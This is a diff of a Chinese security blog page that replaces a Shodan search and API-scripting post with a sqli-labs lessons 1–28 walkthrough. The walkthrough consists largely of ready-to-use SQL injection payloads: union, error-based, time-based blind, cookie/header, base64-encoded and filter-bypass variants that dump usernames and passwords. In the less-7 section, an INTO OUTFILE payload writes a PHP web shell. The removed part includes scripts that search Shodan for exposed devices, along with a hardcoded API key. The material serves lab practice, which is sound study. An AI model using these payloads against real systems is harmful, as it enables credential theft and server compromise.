@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>shodan使用及poc批量 | 不过是块石头而已</title>
+  <title>sqli-lab学习 | 不过是块石头而已</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="什么是ShodanShodan是互联网上最可怕的搜索引擎。凡是链接到互联网的红绿灯、安全摄像头、家庭设备以及加热系统等等都会被轻易的搜索到。">
+  <meta name="description" content="vs2022自 sqli-labs 1-28">
 <meta property="og:type" content="article">
-<meta property="og:title" content="shodan使用及poc批量">
-<meta property="og:url" content="http://example.com/2022/05/03/shodan%E4%BD%BF%E7%94%A8%E5%8F%8Apoc%E6%89%B9%E9%87%8F/index.html">
+<meta property="og:title" content="sqli-lab学习">
+<meta property="og:url" content="http://example.com/2021/06/09/sqli-labs/index.html">
 <meta property="og:site_name" content="不过是块石头而已">
-<meta property="og:description" content="什么是ShodanShodan是互联网上最可怕的搜索引擎。凡是链接到互联网的红绿灯、安全摄像头、家庭设备以及加热系统等等都会被轻易的搜索到。">
+<meta property="og:description" content="vs2022自 sqli-labs 1-28">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-05-03T06:21:00.000Z">
-<meta property="article:modified_time" content="2022-05-03T16:04:44.592Z">
+<meta property="article:published_time" content="2021-06-09T12:58:48.000Z">
+<meta property="article:modified_time" content="2022-05-11T12:42:49.082Z">
 <meta property="article:author" content="lam">
-<meta property="article:tag" content="工具">
+<meta property="article:tag" content="练习">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="不过是块石头而已" type="application/atom+xml">
@@ -137,143 +137,371 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-shodan使用及poc批量" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sqli-labs" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      shodan使用及poc批量
+      sqli-lab学习
     </h1>
   
 
         
-        <a href="/2022/05/03/shodan%E4%BD%BF%E7%94%A8%E5%8F%8Apoc%E6%89%B9%E9%87%8F/" class="archive-article-date">
-  	<time datetime="2022-05-03T06:21:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-03</time>
+        <a href="/2021/06/09/sqli-labs/" class="archive-article-date">
+  	<time datetime="2021-06-09T12:58:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="什么是Shodan"><a href="#什么是Shodan" class="headerlink" title="什么是Shodan"></a>什么是Shodan</h3><p><strong>Shodan是互联网上最可怕的搜索引擎</strong>。凡是链接到互联网的红绿灯、安全摄像头、家庭设备以及加热系统等等都会被轻易的搜索到。</p>
+        <p>vs2022自</p>
+<p>sqli-labs 1-28</p>
 <span id="more"></span>
 
-<h3 id="Shodan的基本语法"><a href="#Shodan的基本语法" class="headerlink" title="Shodan的基本语法"></a>Shodan的基本语法</h3><pre><code>hostname：&quot;主机或域名&quot;
-如 hostname:&quot;google&#39;&#39;
-
-port：&quot;端口或服务&quot;
-如 port:&quot;21&quot;
-
-ip : &quot;ip地址&quot;
-如 ip : &quot;168.200.71.60&quot;
-
-net：&quot;IP地址或子网&quot;
-如 net:&quot;210.45.24.0/24&quot;
-
-vuln :指定漏洞的cve
-如 vuln:CVE-2015-8869
-但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160
-
-os :&quot;操作系统&quot;
-​如 os:&quot;centOS&quot;
-
-isp：&quot;ISP供应商&quot;
-如 isp:&quot;China Telecom&quot;
-
-product：&quot;操作系统/软件/平台&quot;
-如 product:&quot;Apache httpd&quot;
-
-version：&quot;软件版本&quot;
-如 version:&quot;3.1.6&quot;
-
-geo：&quot;经纬度&quot;
-如 geo:&quot;39.8779,116.4550&quot;
-
-country：&quot;国家&quot;
-如 country:&quot;China&quot;
-country:&quot;UN&quot;
-
-city：&quot;城市&quot;
-如 city:&quot;Hefei&quot;
-
-org：&quot;组织或公司&quot;
-如 org:&quot;google&quot;
-
-before/after：&quot;日/月/年&quot;
-如 before:&quot;25/03/2018&quot;
-after:&quot;25/03/2018&quot;
-
-asn : &quot;自治系统号码&quot;
-如 asn:&quot;AS2233&quot;
+<h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>以下拥有的表名</p>
+<blockquote>
+<p>1.schemata</p>
+<p>2.tables</p>
+<p>3.columns</p>
+</blockquote>
+<h5 id="schemata"><a href="#schemata" class="headerlink" title="schemata"></a>schemata</h5><blockquote>
+<p>1.schema_name</p>
+<p>….</p>
+</blockquote>
+<h5 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h5><blockquote>
+<p>table_schema</p>
+<p>table_name</p>
+</blockquote>
+<h5 id="columns"><a href="#columns" class="headerlink" title="columns"></a>columns</h5><blockquote>
+<p>table_schema</p>
+<p>table_name</p>
+<p>column_name</p>
+</blockquote>
+<h3 id="sql基本语句"><a href="#sql基本语句" class="headerlink" title="sql基本语句"></a>sql基本语句</h3><pre><code>order by 4 --+
+判断有多少列
+union select 1,2,3 --+
+判断数据显示点
+union select 1,user(),database() --+
+­显示出登录用户和数据库名
+union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; ),3 --+
+查看数据库有哪些表
+union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name=&#39;users&#39; ),3 --+
+查看对应表有哪些列
+union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 --+
+查看账号密码信息
 </code></pre>
-<h3 id="下载Shodan项目"><a href="#下载Shodan项目" class="headerlink" title="下载Shodan项目"></a>下载Shodan项目</h3><pre><code>git clone https://github.com/achillean/shodan-python.git
-
-#下载完成后
-cd shodan-python
-python setup.py install
+<p>宽字节</p>
+<pre><code>%df&#39; 1=2 union select 1,2#
 </code></pre>
-<h5 id="Key进行初始化"><a href="#Key进行初始化" class="headerlink" title="Key进行初始化"></a>Key进行初始化</h5><p>在Web网站的个人主页可以看到自己的API Key </p>
-<pre><code>shodan init API_Key
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><pre><code>python sqlmap.py -r C:\Users\霖\Desktop\1.txt
+1.txt通过burpsuite抓包后获取
 </code></pre>
-<h5 id="用shodan查询"><a href="#用shodan查询" class="headerlink" title="用shodan查询"></a>用shodan查询</h5><p>如 shodan count +”Apache”</p>
-<pre><code>shodan count &quot;Apache&quot;
-xxxxxxx              //一串数字
+<pre><code>python sqlmap.py -r C:\Users\霖\Desktop\1.txt --dbs
+获取所有数据库信息
 </code></pre>
-<p>官方文档:<a target="_blank" rel="noopener" href="https://shodan.readthedocs.io/en/latest/index.html">https://shodan.readthedocs.io/en/latest/index.html</a></p>
-<h3 id="POC自动化"><a href="#POC自动化" class="headerlink" title="POC自动化"></a>POC自动化</h3><p>环境:python 3.7.8</p>
-<pre><code>#初始化API
-import shodan 
-shodan_API_KEY =&#39;&#39;          //可以在WEB端的个人页面获取到
-shodan_api=shodan.Shodan(shodan_API_KEY)
+<pre><code>python sqlmap.py -r C:\Users\霖\Desktop\1.txt -D flag --tables
+查看数据库的表
 </code></pre>
-<p>初始化后，就可以使用shodan的库函数了</p>
-<pre><code> shodan_api.count(query, facets=None): 查询结果的数量
-
- shodan_api.host(ip, history=False): 获取一个IP的详细信息
-
- shodan_api.ports(): 获取Shodan可查询的端口号
-
- shodan_api.protocols(): 获取Shodan可查询的协议
-
- shodan_api.services(): 获取Shodan可查询的服务
-
- shodan_api.scan(ips, force=False): 使用Shodan进行扫描，ips 可以为字符或字典类型
+<pre><code>python sqlmap.py -r C:\Users\霖\Desktop\1.txt -D flag -T fllag --columns
+查看表的字段
 </code></pre>
-<p>官方API文档：<a target="_blank" rel="noopener" href="https://developer.shodan.io/api">https://developer.shodan.io/api</a></p>
-<h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><p>获取指定IP相关信息</p>
-<pre><code>import shodan
-import json
-
-SHODAN_API_KEY = &#39;7FYm8tOepPnmpGP3iT8GPvjzE4BdgHPu&#39;
-shodan_api = shodan.Shodan(SHODAN_API_KEY)
-ip = shodan_api.host(&#39;127.0.0.1&#39;)
-print(json.dumps(ip))
-
+<pre><code>python sqlmap.py -r C:\Users\霖\Desktop\1.txt -D flag -T fllag -C &#39;fllllllag&#39; --dump
+打印字段
 </code></pre>
-<h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><pre><code>import shodan
-import json
-
-SHODAN_AIP_KEY = &#39;7FYm8tOepPnmpGP3iT8GPvjzE4BdgHPu&#39;
-shodan_api = shodan.Shodan(SHODAN_AIP_KEY)
-
-results = shodan_api.search(&#39;JAWS/1.0&#39;)
-print(f&#39;Results found:&#123;results[&quot;total&quot;]&#125;&#39;)
-
-for result in results[&#39;matches&#39;]:
-    print(result[&#39;ip_str&#39;] + &quot;:&quot; + str(result[&#39;port&#39;]))
-
+<hr>
+<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>字符型联合注入(单引号)</p>
+<p>查字段数量</p>
+<pre><code>/?id=1&#39; order by 3--+
 </code></pre>
-<pre><code>Results found:68948
-120.xx.xxx.242:143
-90.xxx.xx.228:60001
-185.xxx.xxx.244:84
-94.73.xx.xxx:8000
-47.91.xx.xxx:8009
-。。。
+<p>查看显示位</p>
+<pre><code>/?id=0&#39; union select 1,2,3--+
 </code></pre>
-<p>未完待续..</p>
+<p>查数据库</p>
+<pre><code>/?id=0&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+
+</code></pre>
+<p>查使用的数据库</p>
+<pre><code>/?id=0&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),select database()--+
+</code></pre>
+<p>查表</p>
+<pre><code>/?id=0&#39; union select 1,select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;,3--+
+</code></pre>
+<p>查字段名</p>
+<pre><code>/?id=0&#39;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;,3--+
+</code></pre>
+<p>暴库</p>
+<pre><code>/?id=0&#39; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)--+
+</code></pre>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>数字型联合注入</p>
+<p>将 分号 去掉即可，同less-1</p>
+<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>字符型联合注入(单引号+圆括号)</p>
+<p>与less-1的不同之处在于后台处理语句将参数</p>
+<p>放在类似于(‘$a’)中，用 ‘) 绕过</p>
+<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><p>字符型联合注入(双引号+圆括号)</p>
+<p>与less-3类似，用”)绕过</p>
+<p>参数放在(“$a”)中</p>
+<h2 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h2><p>常用函数</p>
+<p>updatexml( 目标xml文档，xml路径，更新的内容 )</p>
+<p>extractvalue( 目标xml文档，xml路径 )</p>
+<p>polygon(),可以用于替换updatexml（生僻函数）</p>
+<p>substr(),substring(),ascii(),left()</p>
+<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>字符型报错盲注(单引号)</p>
+<p>判断是否有注入</p>
+<pre><code>http://localhost:8080/Less-5/?id=1 正常有回显
+http://localhost:8080/Less-5/?id=1&#39; 报错
+</code></pre>
+<p>判断注入类型</p>
+<pre><code>http://localhost:8080/Less-5/?id=1 and 1=1 正常有回显
+http://localhost:8080/Less-5/?id=1 and 1=2 正常有回显
+http://localhost:8080/Less-5/?id=1&#39; and &#39;1&#39;=&#39;1 正常有回显
+http://localhost:8080/Less-5/?id=1&#39; and &#39;1&#39;=&#39;2 正常无回显
+</code></pre>
+<p>报错注入(updatexml())</p>
+<pre><code>http://localhost:8080/Less-5/?id=1 &#39; and updatexml(1,concat(0x7e,version()),0) --+
+</code></pre>
+<p>爆数据库</p>
+<pre><code>http://localhost:8080/Less-5/?id=1 &#39; and updatexml(1,concat(0x7e,database()),0) --+
+</code></pre>
+<p>表名</p>
+<pre><code>http://localhost:8080/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0) --+
+</code></pre>
+<p>字段</p>
+<pre><code>http://localhost:8080/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),0) --+
+</code></pre>
+<p>爆数据</p>
+<pre><code>http://localhost:8080/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),0) --+
+</code></pre>
+<p>这里的话 updatexml一次只能爆出31位的数据，要多次查询</p>
+<p>使用substr</p>
+<p>substr(str,pos,(len))：从字符串中指定位置开始截取字符串，长度可选，默认全部</p>
+<pre><code>http://localhost:8080/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),31)from users)),0) --+
+</code></pre>
+<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><p>字符型报错盲注(双引号)</p>
+<p>以下用extractvalue函数进行演示</p>
+<p>爆数据库</p>
+<pre><code>http://localhost:8080/Less-6/?id=1 &quot; and extractvalue(1,concat(0x7e,database())) --+
+</code></pre>
+<p>表名</p>
+<pre><code>http://localhost:8080/Less-6/?id=1 &quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
+</code></pre>
+<p>字段</p>
+<pre><code>http://localhost:8080/Less-6/?id=1 &quot; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+
+</code></pre>
+<p>报数据</p>
+<pre><code>http://localhost:8080/Less-6/?id=1&quot; and extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),31) from users))) --+
+</code></pre>
+<h2 id="导入导出的相关操作"><a href="#导入导出的相关操作" class="headerlink" title="导入导出的相关操作"></a>导入导出的相关操作</h2><p>load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
+<p>且只能有权限读取并且文件完全可读</p>
+<p>可用以下sql进行测试</p>
+<pre><code>and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常,说明具有读写权限。
+and (select count(*) from mysql.user)&gt;0/* 返回错误， 应该是管理员给数据库帐户降权
+</code></pre>
+<p>其次，需要指定文件的完整路径（绝对物理路径）</p>
+<pre><code>SELECT.....INTO OUTFILE &#39;file_name&#39;
+</code></pre>
+<p>此处可以写入php一句话木马，花样还是挺多的</p>
+<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>这里不知道是docker的什么原因注入了代码后在容器的html文件夹下没有发现我导出的文件，所以只给出代码。</p>
+<pre><code>id=1&#39;)) union select 1,&quot;&lt;?php ($_POST[&#39;shell&#39;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/shell.php&quot; 
+</code></pre>
+<p>导出后用菜刀或antsword连接</p>
+<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>#get方法无报错回显单引号布尔盲注 </p>
+<p>看了下源码与less-5类似，但less-8把报错注释了</p>
+<p>猜数据库字数</p>
+<p>建议使用py脚本进行解题，或者sqlmap</p>
+<h3 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h3><p>单引号延时注入</p>
+<p>sleep() ： 正确的时候直接返回，不正确就等5S</p>
+<p>猜测数据库</p>
+<pre><code>http://127.0.0.1:8080/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
+</code></pre>
+<p>猜测表</p>
+<p>emails和referers</p>
+<pre><code>http://127.0.0.1:8080/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_s
+chema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101,1,sleep(5))--+
+</code></pre>
+<pre><code>http://127.0.0.1/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_s
+chema.tables where table_schema=&#39;security&#39; limit 1,1),1,1))=114,1,sleep(5))--+
+</code></pre>
+<p>猜测字段</p>
+<pre><code>http://127.0.0.1:8080/Less-9/?id=1&#39;and If(ascii(substr((select column_name from information
+_
+schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105,1,sleep(5))--+
+</code></pre>
+<p>猜测字段名</p>
+<pre><code>http://127.0.0.1:8080/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1),
+1,1))=68,1,sleep(5))--+
+</code></pre>
+<p>猜测字段的第一行第一位，以此类推可以拿到帐号密码</p>
+<h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><p>双引号延时注入</p>
+<p>同less-9，将单引号改为双引号即可</p>
+<h3 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h3><p>单引号post注入</p>
+<p>使用万能密码发现登录成功，找到注入点</p>
+<pre><code>admin &#39;or&#39; 1&#39;=&#39;1#
+</code></pre>
+<p>找库</p>
+<pre><code>uname= 1 &#39;union select  group_concat(schema_name) ,1 from information_schema.schemata  #&amp;passwd=
+</code></pre>
+<p>找表</p>
+<pre><code>uname= 1 &#39;union select  group_concat(table_name) ,1 from information_schema.tables where table_schema=&#39;security&#39;  #&amp;passwd=
+</code></pre>
+<p>找字段</p>
+<pre><code>uname= 1 &#39;union select  group_concat(column_name) ,1 from information_schema.columns where table_name=&#39;users&#39;  #&amp;passwd=
+</code></pre>
+<p>爆数据</p>
+<pre><code>uname= 1 &#39;union select  group_concat(username),group_concat(password )from users #&amp;passwd=
+</code></pre>
+<h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><p>双引号圆括号型post注入</p>
+<p>同less-11，将单引号 改为  “) 即可</p>
+<pre><code>uname= 1 &quot;)union select  group_concat(username),group_concat(password )from users #&amp;passwd=
+</code></pre>
+<h3 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h3><p>单引号圆括号型post+布尔注入</p>
+<p>没有回显，只能拿到sql报错的信息</p>
+<p>类似less-6</p>
+<p>找库</p>
+<pre><code>uname=1 &#39;) and extractvalue(1,concat(0x7e,(select database()))) and (&#39;&amp;passwd=&amp;submit=Submit
+</code></pre>
+<p>找表</p>
+<pre><code>uname=1 &#39;) and extractvalue(1,concat(0x7e,( select group_concat(table_name) from information_schema.tables where table_schema=database()))) and (&#39;&amp;passwd=&amp;submit=Submit
+</code></pre>
+<p>找字段</p>
+<pre><code>uname=1 &#39;) and extractvalue(1,concat(0x7e,( select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) and (&#39;&amp;passwd=&amp;submit=Submit
+</code></pre>
+<p>爆数据（这一段的话，每次只爆出32位，可以参考less-6）</p>
+<pre><code>uname=1&#39;) and extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),31) from users))) and (&#39;&amp;passwd=&amp;submit=Submit
+</code></pre>
+<h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><p>双引号post注入，同less-13类似</p>
+<p>将 ‘) 改为 “ 即可</p>
+<pre><code>uname=1 &quot;and extractvalue(1,concat(0x7e,(select substr(group_concat(username,0x3a,password),31) from users))) #&amp;passwd=&amp;submit=Submit
+</code></pre>
+<p>也可以将 passwd 前的 and(‘ 改为 #或–+进行注入，姿势很多。</p>
+<h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><p>又是盲注..</p>
+<p>单引号布尔和时间盲注结合</p>
+<p>参考less-9</p>
+<p>查表</p>
+<pre><code>uname=admin&#39; and if(ascii(substr((select group_concat(table_name) from information_schema.tables limit 0,1),1,1))&gt;10,sleep(5),1)#&amp;passwd=111&amp;submit=submit
+</code></pre>
+<p>查列</p>
+<pre><code>uname=admin&#39; and if(ascii(substr((select group_concat(table_name) from information_schema.tables limit 0,1),1,1))&gt;10,sleep(5),1)#&amp;passwd=111&amp;submit=submit
+</code></pre>
+<p>查用户名</p>
+<pre><code>uname=admin&#39; and if(ascii(substr((select group_concat(username) from users limit 0,1),1,1))&gt;10,sleep(5),1)--+#&amp;passwd=111&amp;submit=submit
+</code></pre>
+<p>查密码</p>
+<pre><code>uname=admin&#39; and if(ascii(substr((select group_concat(password) from users limit 0,1),1,1))&gt;10,sleep(5),1)#&amp;passwd=111&amp;submit=submit
+</code></pre>
+<h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><p>同less-15，双引号圆括号型</p>
+<p>id&#x3D;(“$ID”)，你懂的。</p>
+<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><p>基于密码 单引号报错注入</p>
+<pre><code>uname=admin&amp;passwd=&#39; and (updatexml(1,concat(0x7e, database(),0x7e),1))#
+</code></pre>
+<p>database()替换成其他子句即可通关，如less-6</p>
+<p>值得注意的是，爆破数据的时候建议使用脚本</p>
+<p>这里需要双查询，有点麻烦</p>
+<pre><code>uname=admin&amp;passwd=&#39; and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and &#39;1&amp;submit=Submit
+</code></pre>
+<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><p>HTTP user_agent注入</p>
+<p>这里的话，使用了check_input()，username和password注入不了</p>
+<p>利用burpsuite进行抓包，修改user_agent为注入代码</p>
+<pre><code>&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) and &#39;1
+</code></pre>
+<h3 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h3><p> HTTP REFERER注入</p>
+<p>同less-18，修改referer位置的字符串即可</p>
+<pre><code>Your Referer is: http://127.0.0.1:8080/Less-19/&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) and &#39;1
+</code></pre>
+<h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p>HTTP cookie注入</p>
+<p>同上，抓包登录，登录后 修改cookie的信息，</p>
+<p>本题后端是在登录后检查cookie获取用户名进行查询，所以登录后将cookie改为如下即可</p>
+<pre><code>&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users))) and &#39;1
+</code></pre>
+<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>HTTP cookie+base64单引号注入</p>
+<p>基本同less-20,将sql注入代码进行base64编码即可</p>
+<pre><code>JyBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpKSkgYW5kICcx
+</code></pre>
+<h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>HTTP cookie+base64双引号注入</p>
+<p>基本同less-21，将sql注入代码进行base64编码即可</p>
+<pre><code>IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMpKSkgYW5kICIx
+</code></pre>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>过滤注释符号的get报错注入</p>
+<p>由于注释符号被过滤了，所以构造闭合语句</p>
+<pre><code>?id=&#39; union select 1,2,database() &#39;
+</code></pre>
+<p>爆字段</p>
+<pre><code>?id=&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; or &#39;1&#39;= &#39;
+</code></pre>
+<p>爆数据</p>
+<pre><code>?id=&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; = &#39;
+</code></pre>
+<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>二次排序注入</p>
+<p>先注册一个名为 admin’# 的账户</p>
+<p>进入账户后，修改密码</p>
+<pre><code>UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#39; admin&#39;# &#39; AND password=&#39;
+</code></pre>
+<p>本意是修改admin’#的密码，实际上执行了修改admin的密码，可以利用你改的密码登录admin的账户,成功执行注入。</p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤or和and的，常用绕过方法</p>
+<p>1.大小写绕过</p>
+<p>2.hex，unicode绕过</p>
+<p>3.内联注释</p>
+<p>4.&amp;&amp;&#x3D;and ，||&#x3D;or</p>
+<p>5.双写绕过</p>
+<p>测试</p>
+<pre><code>http://localhost:8080/Less-25/?id=1&#39;--+
+</code></pre>
+<pre><code>http://localhost:8080/Less-25/?id=-1&#39; union select 1,2,database()--+
+</code></pre>
+<p>ps：-1的结果和1的结果不同，-1会直接显示2,database()的显示位</p>
+<p>爆表</p>
+<pre><code>http://localhost:8080/Less-25/?id=-1&#39; union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+
+</code></pre>
+<p>ps：password因为or过滤的原因，需要双写，本题也可报错注入</p>
+<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>类似25，报错关闭，只能延时注入和联合注入</p>
+<pre><code>http://127.0.0.1:8080/Less-25a/?id=-1%20UNION%20select%201,@@basedir,3%23
+</code></pre>
+<p>直接注入</p>
+<pre><code>http://127.0.0.1:8080/Less-25a/?id=-1 UNION select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3#
+</code></pre>
+<p>ps：information，password双写嗷！</p>
+<pre><code>http://127.0.0.1:8080/Less-25a/?id=-1 UNION select 1,(select group_concat(username) from security.users),(select group_concat(passwoorrd) from security.users)#
+</code></pre>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>基于less-25，过滤了空格和注释</p>
+<p> or，and ， &#x2F;* , – , # , 空格 , &#x2F;   黑名单全家桶</p>
+<p>空格有很多种</p>
+<pre><code>%09 TAB 键（水平）
+%0a 新建一行
+%0c 新的一页
+%0d return 功能
+%0b TAB 键（垂直）
+%a0 空格
+</code></pre>
+<p>测试</p>
+<pre><code>http://127.0.0.1:8080/Less-26/?id=100%27union%a0select%a01,6,3||%271
+</code></pre>
+<p>这边不知道为什么-1不行，只能让前面的数超过数据库里数据的数量</p>
+<p>帐号</p>
+<pre><code>http://127.0.0.1:8080/Less-26/?id=100%27union%a0select%a0(select%a0group_concat(passwoorrd)%a0from%a0security.users),(select%a0group_concat(username)%a0from%a0security.users),3||%271
+</code></pre>
+<p>密码</p>
+<pre><code>http://127.0.0.1:8080/Less-26/?id=100%27union%a0select%a0%a0(select%a0group_concat(passwoorrd)%a0from%a0security.users),(select%a0group_concat(passwoorrd)%a0from%a0security.users),8||%271
+</code></pre>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>基于26,加了括号</p>
+<p>帐号</p>
+<pre><code>http://127.0.0.1:8080/Less-26a/?id=100&#39;)union%a0select%a0%a0(select%a0group_concat(passwoorrd)%a0from%a0security.users),(select%a0group_concat(username)%a0from%a0security.users),8||(%27 1
+</code></pre>
+<p>密码</p>
+<pre><code>http://127.0.0.1:8080/Less-26a/?id=100&#39;)union%a0select%a0%a0(select%a0group_concat(passwoorrd)%a0from%a0security.users),(select%a0group_concat(passwoorrd)%a0from%a0security.users),8||(%27 1
+</code></pre>
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>过滤union select,可以大小写混写，双写绕过</p>
+<pre><code>http://127.0.0.1:8080/Less-27/?id= 100 &#39;UniOn%a0SeLEct%a01,database(),3||&#39;1#
+</code></pre>
+<p>帐号</p>
+<pre><code>http://127.0.0.1:8080/Less-27/?id=100&#39;uNion%a0seLect%a0%a0(seLect%a0group_concat(password)%a0from%a0security.users),(seLect%a0group_concat(username)%a0from%a0security.users),8||%27 
+</code></pre>
+<p>密码</p>
+<pre><code>http://127.0.0.1:8080/Less-26a/?id=100&#39;uNion%a0seLect%a0%a0(seLect%a0group_concat(passwoorrd)%a0from%a0security.users),(seLect%a0group_concat(passwoorrd)%a0from%a0security.users),8||%27 1
+</code></pre>
+<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>同27,单引号改为双引号即可</p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><h3 id="极客大挑战2021-babysql"><a href="#极客大挑战2021-babysql" class="headerlink" title="极客大挑战2021 babysql"></a>极客大挑战2021 babysql</h3><pre><code>uname=123&amp;pwd=&#39; UNION ALL SELECT NULL,CONCAT(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;babysql&#39; and table_name=&#39;jeffjokes&#39;),0x7e),NULL,NULL-- -&amp;wp-submit=%E7%99%BB%E5%BD%95
+</code></pre>
 
       
 
@@ -308,7 +536,7 @@ for result in results[&#39;matches&#39;]:
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">练习</a>
         		</li>
       		
 		</ul>
@@ -364,7 +592,7 @@ for result in results[&#39;matches&#39;]:
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
